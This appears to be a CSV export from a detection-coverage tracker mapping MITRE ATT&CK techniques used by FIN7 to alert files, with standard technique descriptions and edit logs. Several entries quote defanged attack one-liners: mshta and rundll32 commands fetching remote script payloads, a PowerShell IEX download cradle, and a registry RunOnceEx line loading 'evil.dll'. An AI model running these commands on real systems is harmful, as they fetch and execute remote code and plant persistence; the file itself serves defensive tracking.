T1102.002,Bidirectional Communication,Command-And-Control,Pending,alerts\FIN7\T1102.002_Bidirectional_Communication.html,,APT Matrix Generator,"Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet.   Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection. ",https://attack.mitre.org/techniques/T1102/002/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1105,Ingress Tool Transfer,Command-And-Control,Pending,alerts\FIN7\T1105_Ingress_Tool_Transfer.html,,APT Matrix Generator,"Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp](https://attack.mitre.org/software/S0095). Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)).   On Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil](https://attack.mitre.org/software/S0160), and [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.(Citation: t1105_lolbas)  A number of these tools, such as `wget`, `curl`, and `scp`, also exist on ESXi. After downloading a file, a threat actor may attempt to verify its integrity by checking its hash value (e.g., via `certutil -hashfile`).(Citation: Google Cloud Threat Intelligence COSCMICENERGY 2023)  Adversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by [User Execution](https://attack.mitre.org/techniques/T1204) (typically after interacting with [Phishing](https://attack.mitre.org/techniques/T1566) lures).(Citation: T1105: Trellix_search-ms)  Files can also be transferred using various [Web Service](https://attack.mitre.org/techniques/T1102)s as well as native or otherwise present tools on the victim system.(Citation: PTSecurity Cobalt Dec 2016) In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.(Citation: Dropbox Malware Sync)",https://attack.mitre.org/techniques/T1105/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1113,Screen Capture,Collection,Pending,alerts\FIN7\T1113_Screen_Capture.html,,APT Matrix Generator,"Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>.(Citation: CopyFromScreen .NET)(Citation: Antiquated Mac Malware) ",https://attack.mitre.org/techniques/T1113/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1125,Video Capture,Collection,Pending,alerts\FIN7\T1125_Video_Capture.html,,APT Matrix Generator,"An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.  Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from [Screen Capture](https://attack.mitre.org/techniques/T1113) due to use of specific devices or applications for video recording rather than capturing the victim's screen.  In macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton. (Citation: objective-see 2017 review)",https://attack.mitre.org/techniques/T1125/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1190,Exploit Public-Facing Application,Initial-Access,Pending,alerts\FIN7\T1190_Exploit_Public-Facing_Application.html,,APT Matrix Generator,"Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.  Exploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet-accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) On ESXi infrastructure, adversaries may exploit exposed OpenSLP services; they may alternatively exploit exposed VMware vCenter servers.(Citation: Recorded Future ESXiArgs Ransomware 2023)(Citation: Ars Technica VMWare Code Execution Vulnerability 2021) Depending on the flaw being exploited, this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).  If an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs (e.g., via the [Cloud Instance Metadata API](https://attack.mitre.org/techniques/T1552/005)), exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.  Adversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)  For websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",https://attack.mitre.org/techniques/T1190/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1195.002,Compromise Software Supply Chain,Initial-Access,Pending,alerts\FIN7\T1195.002_Compromise_Software_Supply_Chain.html,,APT Matrix Generator,"Adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version.  Targeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Avast CCleaner3 2018)(Citation: Command Five SK 2011)  ",https://attack.mitre.org/techniques/T1195/002/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1204.001,Malicious Link,Execution,Tested,alerts\FIN7\T1204.001_Malicious_Link.html,,APT Matrix Generator,An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203). Links may also lead users to download files that require execution via [Malicious File](https://attack.mitre.org/techniques/T1204/002).,https://attack.mitre.org/techniques/T1204/001/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1204.002,Malicious File,Execution,Pending,alerts\FIN7\T1204.002_Malicious_File.html,,APT Matrix Generator,"An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, .cpl, and .reg.  Adversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) and [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.(Citation: Password Protected Word Docs)   While [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).",https://attack.mitre.org/techniques/T1204/002/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1210,Exploitation of Remote Services,Lateral-Movement,Pending,alerts\FIN7\T1210_Exploitation_of_Remote_Services.html,,APT Matrix Generator,"Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.  An adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.  There are several well-known vulnerabilities that exist in common services such as SMB(Citation: CIS Multiple SMB Vulnerabilities) and RDP(Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL(Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)(Citation: Ars Technica VMWare Code Execution Vulnerability 2021) Additionally, there have been a number of vulnerabilities in VMware vCenter installations, which may enable threat actors to move laterally from the compromised vCenter server to virtual machines or even to ESXi hypervisors.(Citation: Broadcom VMSA-2024-0019)  Depending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",https://attack.mitre.org/techniques/T1210/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1218.005,Mshta,Defense-Evasion,Pending,alerts\FIN7\T1218.005_Mshta.html,,APT Matrix Generator,"Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017)   Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)  Files may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(""GetObject(""""script:https[:]//webserver/payload[.]sct"""")""))</code>  They may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>  Mshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)",https://attack.mitre.org/techniques/T1218/005/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1218.011,Rundll32,Defense-Evasion,Pending,alerts\FIN7\T1218.011_Rundll32.html,,APT Matrix Generator,"Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).  Rundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute.(Citation: Trend Micro CPL) For example, [ClickOnce](https://attack.mitre.org/techniques/T1127/002) can be proxied through Rundll32.exe.  Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https[:]//www[.]example[.]com/malicious.sct"")""</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)  Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll) DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).  Additionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.(Citation: rundll32.exe defense evasion) ",https://attack.mitre.org/techniques/T1218/011/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1219,Remote Access Tools,Command-And-Control,Tested,alerts\FIN7\T1219_Remote_Access_Tools.html,,APT Matrix Generator,"An adversary may use legitimate remote access tools to establish an interactive command and control channel within a network. Remote access tools create a session between two trusted hosts through a graphical interface, a command line interaction, a protocol tunnel via development or management software, or hardware-level access such as KVM (Keyboard, Video, Mouse) over IP solutions. Desktop support software (usually graphical interface) and remote management software (typically command line interface) allow a user to control a computer remotely as if they are a local user inheriting the user or software permissions. This software is commonly used for troubleshooting, software installation, and system management.(Citation: Symantec Living off the Land)(Citation: CrowdStrike 2015 Global Threat Report)(Citation: CrySyS Blog TeamSpy) Adversaries may similarly abuse response features included in EDR and other defensive tools that enable remote access.  Remote access tools may be installed and used post-compromise as an alternate communications channel for redundant access or to establish an interactive remote desktop session with the target system. It may also be used as a malware component to establish a reverse connection or back-connect to a service or adversary-controlled system.  Installation of many remote access tools may also include persistence (e.g., the software's installation routine creates a [Windows Service](https://attack.mitre.org/techniques/T1543/003)). Remote access modules/features may also exist as part of otherwise existing software (e.g., Google Chrome’s Remote Desktop).(Citation: Google Chrome Remote Desktop)(Citation: Chrome Remote Desktop)",https://attack.mitre.org/techniques/T1219/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1486,Data Encrypted for Impact,Impact,Pending,alerts\FIN7\T1486_Data_Encrypted_for_Impact.html,,APT Matrix Generator,"Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.(Citation: US-CERT Ransomware 2016)(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017)(Citation: US-CERT SamSam 2018)  In the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) or [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529), in order to unlock and/or gain access to manipulate these files.(Citation: CarbonBlack Conti July 2020) In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR.(Citation: US-CERT NotPetya 2017) Adversaries may also encrypt virtual machines hosted on ESXi or other hypervisors.(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)   To maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017) Encryption malware may also leverage [Internal Defacement](https://attack.mitre.org/techniques/T1491/001), such as changing victim wallpapers or ESXi server login messages, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as ""print bombing"").(Citation: NHS Digital Egregor Nov 2020)(Citation: Varonis)  In cloud environments, storage objects within compromised accounts may also be encrypted.(Citation: Rhino S3 Ransomware Part 1) For example, in AWS environments, adversaries may leverage services such as AWS’s Server-Side Encryption with Customer Provided Keys (SSE-C) to encrypt data.(Citation: Halcyon AWS Ransomware 2025)",https://attack.mitre.org/techniques/T1486/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1497.002,User Activity Based Checks,"Defense-Evasion, Discovery",Pending,alerts\FIN7\T1497.002_User_Activity_Based_Checks.html,,APT Matrix Generator,"Adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness)  Adversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks (Citation: Sans Virtual Jan 2016) , browser history, cache, bookmarks, or number of files in common directories such as home or the desktop. Other methods may rely on specific user interaction with the system before the malicious code is activated, such as waiting for a document to close before activating a macro (Citation: Unit 42 Sofacy Nov 2018) or waiting for a user to double click on an embedded image to activate.(Citation: FireEye FIN7 April 2017) ",https://attack.mitre.org/techniques/T1497/002/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1543.003,Windows Service,"Persistence, Privilege-Escalation",Pending,alerts\FIN7\T1543.003_Windows_Service.html,,APT Matrix Generator,"Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.  Adversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API.   Adversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as ""Bring Your Own Vulnerable Driver"" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)  Services may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).  To make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create ‘hidden’ services (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)",https://attack.mitre.org/techniques/T1543/003/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1546.011,Application Shimming,"Persistence, Privilege-Escalation",Pending,alerts\FIN7\T1546.011_Application_Shimming.html,,APT Matrix Generator,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. (Citation: Elastic Process Injection July 2017)  Within the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS.   A list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:  * <code>%WINDIR%\AppPatch\sysmain.sdb</code> and * <code>hklm\software\microsoft\windows nt\currentversion\appcompatflags\installedsdb</code>  Custom databases are stored in:  * <code>%WINDIR%\AppPatch\custom & %WINDIR%\AppPatch\AppPatch64\Custom</code> and * <code>hklm\software\microsoft\windows nt\currentversion\appcompatflags\custom</code>  To keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress).  Utilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc. (Citation: FireEye Application Shimming) Shims can also be abused to establish persistence by continuously being invoked by affected programs.",https://attack.mitre.org/techniques/T1546/011/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
T1547.001,Registry Run Keys / Startup Folder,"Persistence, Privilege-Escalation",Pending,alerts\FIN7\T1547.001_Registry_Run_Keys__Startup_Folder.html,,APT Matrix Generator,"Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the ""run keys"" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.(Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.  The following run keys are created by default on Windows systems:  * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code> * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code> * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>  Run keys may exist under multiple hives.(Citation: Microsoft Wow6432Node 2018)(Citation: Malwarebytes Wow6432Node 2016) The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.(Citation: Microsoft Run Key) For example, it is possible to load a DLL at logon using a ""Depend"" key with RunOnceEx: <code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""C:\temp\evil[.]dll""</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)  Placing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\Users\\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code>. The startup folder path for all users is <code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code>.  The following Registry keys can be used to set startup folder items for persistence:  * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code> * <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code> * <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code>  The following Registry keys can control automatic startup of services during boot:  * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code> * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</code>  Using policy settings to specify startup programs creates corresponding values in either of two Registry keys:  * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>  Programs listed in the load value of the registry key <code>HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows</code> run automatically for the currently logged-on user.  By default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.  Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.",https://attack.mitre.org/techniques/T1547/001/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 19:32""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 19:32""}]"
